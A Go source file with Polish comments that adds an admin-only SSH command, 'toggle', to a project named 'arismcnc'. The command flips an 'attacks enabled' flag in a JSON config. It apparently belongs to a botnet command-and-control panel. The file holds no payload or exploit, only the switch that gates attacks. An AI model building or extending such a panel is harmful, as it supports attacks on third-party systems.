package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"

	"github.com/gliderlabs/ssh"
)

type ToggleCommand struct{}

// Nazwa komendy
func (c *ToggleCommand) Name() string {
	return "toggle"
}

// Wykonanie komendy
func (c *ToggleCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	// Pytanie o operację na tej samej linii
	fmt.Fprintf(output, "Select what you want to Toggle (attacks): ")
	operation, err := utils.ReadLine(session)
	if err != nil {
		fmt.Fprintln(output, "Error reading input:", err)
		return
	}

	// Obsługa opcji
	switch operation {
	case "attacks":
		// Załaduj konfigurację
		config, err := utils.LoadConfig("assets/config.json")
		if err != nil {
			fmt.Fprintln(output, "Error loading config:", err)
			return
		}

		// Przełączenie stanu ataków
		err = config.ToggleAttacks()
		if err != nil {
			fmt.Fprintln(output, "Failed to toggle attacks:", err)
			return
		}
		// Wyświetlenie nowego stanu
		status := "enabled"
		if !config.Attacks_enabled {
			status = "disabled"
		}
		fmt.Fprintf(output, "Successfully toggled attacks. Now attacks are %s.\n", status)

	default:
		// Obsługa nieprawidłowego wyboru
		fmt.Fprintln(output, "Invalid option. Available options: attacks.")
	}
}

// Czy komenda jest dostępna tylko dla administratorów
func (c *ToggleCommand) AdminOnly() bool {
	return true
}

// Aliasy komendy
func (c *ToggleCommand) Aliases() []string {
	return []string{"manage", "enable"}
}

// Rejestracja komendy w mapie komend
func init() {
	CommandMap["toggle"] = &ToggleCommand{}
}
